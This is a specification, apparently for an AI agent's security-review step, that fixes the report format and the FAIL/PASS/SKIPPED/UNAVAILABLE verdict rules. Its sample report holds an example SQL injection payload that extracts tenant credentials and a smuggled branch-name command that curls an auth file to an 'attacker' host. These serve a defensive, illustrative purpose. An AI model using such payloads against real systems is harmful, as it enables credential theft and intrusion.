# Report shape

The report is what the caller records, so its shape is fixed. Findings carry `path:line` where `line` is a line the diff touched in the NEW file (for a deleted file, `line` is 1 and the description says "deleted"). Severity and category slugs are the ones from `categories.md`; confidence is the 0–100 scale in `method.md`.

```markdown
## Security review results

**Review scope**: base `<base sha>` (`<base_input>`, ancestry <proven|unproven>) — <code> code files reviewed of <changed> changed; <non_code> non-code files not reviewed
**Phases run**: repository context, comparative analysis, vulnerability assessment

### Confirmed findings (HIGH/MEDIUM at ≥ 80)
- `apps/mirror/src/routes/search.ts:88` — HIGH — sql_injection — 95 — the `q` query parameter is concatenated into the D1 statement.
  Exploit: `?q=' UNION SELECT token FROM tenant_credentials--` returns every tenant's credential rows to the caller.
  Fix: bind it — `db.prepare("... WHERE title LIKE ?").bind(`%${q}%`)` — as the sibling routes already do.
- `apps/runner/src/executors/codex.ts:212` — MEDIUM — command_injection — 82 — the branch name reaches `sh -c` unquoted.
  Exploit: a tenant branch named `x;curl attacker/$(cat ~/.codex/auth.json)` runs in the phase container.
  Fix: pass argv to `spawn` without a shell, as `cli.ts`'s `createRealSpawn` does.

### Informational (70–79, or LOW)
- `apps/web/src/pages/Settings.tsx:41` — LOW — debug_exposure — 75 — the error object is rendered verbatim; stack traces would be visible to the tenant admin.

### Verdict: FAIL
2 confirmed findings (1 HIGH, 1 MEDIUM); 1 informational note.

```catalyst-review-step
{"step":"security-review","verdict":"FAIL","detail":"2 confirmed findings: apps/mirror/src/routes/search.ts:88 SQL injection via q; apps/runner/src/executors/codex.ts:212 branch name reaches sh -c unquoted","findings":[{"path":"apps/mirror/src/routes/search.ts","line":88},{"path":"apps/runner/src/executors/codex.ts","line":212}]}
```
```

## Verdict rules

- **FAIL** — at least one confirmed finding (HIGH or MEDIUM at ≥80). The `findings` array lists every confirmed one, `path` repo-relative, `line` the touched line; informational notes are not in the array.
- **PASS** — no confirmed finding. `detail` names what was checked, e.g. `"no confirmed findings; 7 code files traced against <sha>; 1 informational note"`. Never write PASS for a review you did not perform on a real diff.
- **SKIPPED** — Step 1 said `skipped`: `detail` is the script's reason (empty diff, or non-code only). No `findings`.
- **UNAVAILABLE** — Step 1 said `unavailable`, or the caller's scope block says an empty change list means the base is wrong: `detail` is that reason. No `findings`.

The `catalyst-review-step` line is one JSON object on one line, valid as written. A validate session copies it into its ladder block's `security-review` entry; a hand-run session leaves it in the report for whoever reads it. `detail` is one line naming the evidence; keep it under 500 characters.

## When the scope was unproven

If `ancestry: unproven`, say so in the scope line and keep the review; the diff is still the two-dot diff against the given base, and the caller decides how much to trust it. Do not silently widen or narrow the scope to compensate.
